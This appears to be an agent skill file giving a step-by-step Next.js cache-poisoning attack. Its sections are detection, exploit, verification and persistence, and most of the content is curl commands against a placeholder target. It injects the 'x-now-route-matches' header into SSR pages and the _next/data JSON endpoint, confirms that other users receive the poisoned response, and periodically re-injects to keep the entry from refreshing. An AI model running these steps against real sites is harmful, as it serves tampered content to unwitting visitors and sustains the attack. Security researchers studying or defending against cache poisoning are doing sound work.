---
name: nextjs-cache-poisoning
description: Internal cache poisoning in Next.js via stale cache entries and header manipulation. Use when target runs Next.js (/_next/ paths, x-nextjs-cache header, __nextjs_original-cache-control) and you need to poison cached responses.
---

# Next.js Cache Poisoning

## Detection
```bash
# Check for Next.js cache indicators
curl -sD- "https://target.com/" | rg -i "x-nextjs-cache|x-nextjs-stale|__nextjs_original|x-now-route"

# Find SSR routes with aggressive cache headers
curl -sD- "https://target.com/target-page" | rg "s-maxage|stale-while-revalidate"
```

**Checkpoint:** Must see `x-nextjs-cache` header (HIT/STALE/MISS) or `s-maxage` in response. If all routes return `private, no-cache`, cache poisoning is not viable.

## Exploit

### 1. Identify poisonable route
Find SSR routes with `s-maxage=31536000, stale-while-revalidate` (not `private, no-cache`).

### 2. Inject via x-now-route-matches header
```bash
curl -sD- "https://target.com/target-page" \
  -H "x-now-route-matches: 1"
```

### 3. Target data endpoint directly
```bash
curl -sD- "https://target.com/_next/data/BUILD_ID/target-page.json" \
  -H "x-now-route-matches: 1"
```

### 4. Verify poisoning
```bash
# Check if subsequent requests return poisoned content
curl -s "https://target.com/target-page" | head -50
# Look for x-nextjs-cache: HIT with attacker-controlled data
```

**Checkpoint:** Verify with a different session/IP that the poisoned response is served to other users. Single-user cache hits are not exploitable.

### 5. Maintain poisoned entry
During the `stale-while-revalidate` window, periodically re-inject to prevent cache refresh.

## Indicators
- `x-nextjs-cache: HIT` on subsequent requests returning attacker-controlled data
- Cached JSON endpoint (`/_next/data/`) contains injected content
- Other users receive poisoned response

## Chain With
- web-cache-deception-path (path delimiter confusion + Next.js cache)

## Reference
https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir
